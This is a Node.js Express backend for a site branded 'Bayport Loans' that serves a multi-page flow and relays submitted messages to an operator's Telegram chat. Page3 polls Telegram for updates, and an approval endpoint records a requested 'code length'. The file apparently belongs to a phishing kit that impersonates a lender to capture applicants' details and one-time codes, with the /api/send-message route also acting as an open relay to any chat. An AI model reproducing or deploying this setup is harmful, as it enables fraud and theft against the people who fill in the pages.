const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const dotenv = require('dotenv');
const axios = require('axios');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev')); // Logging

// Serve static files from frontend
app.use(express.static(path.join(__dirname, '../frontend')));

// ==================== API ROUTES ====================

// Health check endpoint (for Render)
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        message: 'Bayport Loans Backend is running',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development'
    });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        success: true, 
        message: 'API is working!',
        data: { version: '1.0.0' }
    });
});

// Send message to Telegram
app.post('/api/send-message', async (req, res) => {
    try {
        const { message, chatId } = req.body;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const adminChatId = chatId || process.env.ADMIN_CHAT_ID;

        if (!botToken) {
            return res.status(500).json({ 
                success: false, 
                error: 'Telegram bot token not configured' 
            });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: adminChatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        res.json({ 
            success: true, 
            data: response.data,
            message: 'Message sent to Telegram'
        });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data || error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// Get updates from Telegram (for polling from page3)
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const { offset = 0 } = req.params;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        if (!botToken) {
            return res.status(500).json({ 
                success: false, 
                error: 'Telegram bot token not configured' 
            });
        }

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            {
                params: {
                    offset: offset,
                    timeout: 30,
                    allowed_updates: ['message']
                }
            }
        );

        res.json({ 
            success: true, 
            data: response.data 
        });
    } catch (error) {
        console.error('Telegram API Error:', error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get updates from Telegram' 
        });
    }
});

// Handle approval from bot (callback endpoint)
app.post('/api/approve', (req, res) => {
    const { referenceId, action, codeLength } = req.body;
    
    console.log(`✅ Application ${referenceId}: ${action} with ${codeLength || 'N/A'} code`);
    
    res.json({ 
        success: true, 
        message: `Application ${referenceId} ${action}`,
        data: { referenceId, action, codeLength }
    });
});

// ==================== FRONTEND ROUTES ====================

// Serve index.html for root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Serve page2.html
app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/page2.html'));
});

// Serve page3.html
app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/page3.html'));
});

// Serve success.html
app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/success.html'));
});

// ==================== ERROR HANDLING ====================

// 404 handler for API routes
app.use('/api/*', (req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'API endpoint not found' 
    });
});

// Catch-all handler - serve index.html for client-side routing
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server Error:', err.stack);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════════════╗
    ║     🚀 BAYPORT LOANS BACKEND SERVER       ║
    ╠════════════════════════════════════════════╣
    ║  📡 Port: ${PORT}                             ║
    ║  🌍 Environment: ${process.env.NODE_ENV || 'development'}        ║
    ║  📁 Frontend: ${path.join(__dirname, '../frontend')}  ║
    ║  🤖 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? '✅' : '❌'}         ║
    ╚════════════════════════════════════════════╝
    `);
});